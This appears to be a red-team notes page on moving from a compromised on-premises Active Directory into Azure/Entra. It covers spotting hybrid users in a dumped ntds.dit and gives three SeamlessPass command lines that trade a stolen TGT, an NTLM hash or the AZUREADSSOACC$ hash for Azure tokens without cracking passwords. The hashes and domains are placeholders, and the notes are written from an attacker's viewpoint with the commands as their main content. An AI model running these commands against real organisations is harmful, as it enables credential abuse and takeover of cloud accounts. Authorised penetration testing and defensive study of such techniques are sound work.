___

## NTDS.dit
---
If a company is using Entra Connect Sync for there hybrid infra, credentials are mirrored in the cloud.
If you compromise an on prem environment and dump the ntds.dit, you can identify users that may have azure access for example:
```bash
DOMAIN.LOCAL\administrator:500:aad3b435b51404eeaad3b435b51404ee:<>::: <-- local user

domain.com\Yimel.Naders:2603:aad3b435b51404eeaad3b435b51404ee:<>::: <-- azure user (the domain is the azure tenant)
```

Probably [[mfa]] next.


### Seamless pass 
___
For organizations with Seamless SSO (Desktop SSO) enabled, if we can dump tickets or hashes, we can access azure tokens even without cracking a password.
https://github.com/Malcrove/SeamlessPass

**Use cases:**

Using compromised user’s Ticket-Granting-Ticket (TGT) or forged Golden Ticket (_Interacts with DC)_
```bash
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_encoded_TGT>
```

Using compromised user’s NTLM hash or AES key (_Interacts with DC)_
```bash
seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF
```

Acquisition of AZUREADSSOACC$ account NTLM hash or AES key _(No interaction with DC is needed)_
```bash
seamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234
```

